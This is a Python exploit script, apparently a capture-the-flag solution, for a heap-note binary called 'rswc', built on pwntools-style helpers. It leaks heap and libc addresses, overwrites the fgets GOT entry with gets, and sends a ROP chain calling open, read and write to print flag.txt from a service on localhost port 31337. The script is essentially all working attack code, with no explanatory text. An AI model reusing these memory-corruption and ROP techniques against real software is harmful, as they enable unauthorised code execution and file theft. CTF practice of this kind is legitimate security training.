#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './rswc'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'localhost', 'port':31337})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6_5d8e5f37ada3fc853363a4f3f631a41a')
env.select()

#==========

binf = ELF(bin_file)
addr_got_fgets      = binf.got['fgets']
addr_filename       = addr_got_fgets+8
addr_rdi            = 0x004012d3
addr_rsi_r15        = 0x004012d1
addr_bss            = binf.sep_section['.bss']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_fgets   = libc.sep_function['fgets']

#==========

def start(conn):
    conn.sendlineafter('$ ', 'ulimit -s unlimited')
    conn.sendlineafter('$ ', './rswc')

def attack(conn):
    rswc = Pwn(conn)

    for _ in range(0x100):
        rswc.alloc(1)

    addr_heap_manage = u(rswc.show(0xff)) - 0x2fe0
    addr_heap_base   = addr_heap_manage + 0x1000
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    rswc.edit(0xff, '\x00'*0x10 + p64(addr_got_fgets - 0x10))
    addr_libc_fgets = u(rswc.show(0xff))
    libc.address    = addr_libc_fgets - offset_libc_fgets
    addr_libc_gets  = libc.sep_function['gets']
    addr_libc_open  = libc.sep_function['open']
    addr_libc_read  = libc.sep_function['read']
    addr_libc_write = libc.sep_function['write']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    rswc.edit(0xff, p64(addr_libc_gets)+'flag.txt\x00')

    exploit  = '\x00'*0x18
    exploit += p64(addr_rdi)
    exploit += p64(addr_filename)
    exploit += p64(addr_rsi_r15)
    exploit += p64(0)
    exploit += p64(0xdeadbeef)
    exploit += p64(addr_libc_open)

    exploit += p64(addr_rdi)
    exploit += p64(3)
    exploit += p64(addr_rsi_r15)
    exploit += p64(addr_bss)
    exploit += p64(0xdeadbeef)
    exploit += p64(addr_libc_read)

    exploit += p64(addr_rdi)
    exploit += p64(1)
    exploit += p64(addr_libc_write)
 
    conn.sendlineafter('> ', exploit)
    
class Pwn:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def alloc(self, size):
        self.sendlineafter('> ', '0')
        self.sendlineafter('size: ', str(size))

    def edit(self, idx, content):
        self.sendlineafter('> ', '1')
        self.sendlineafter('index: ', str(idx))
        self.sendlineafter('content: ', content)

    def show(self, idx):
        self.sendlineafter('> ', '2')
        self.sendlineafter('index: ', str(idx))
        self.recvuntil('content: ')
        return self.recvuntil('\n\n0. ', drop=True)

#==========

if __name__=='__main__':
        conn = communicate(env.mode, **env.target)
        start(conn)
        attack(conn)
        conn.interactive()

#==========
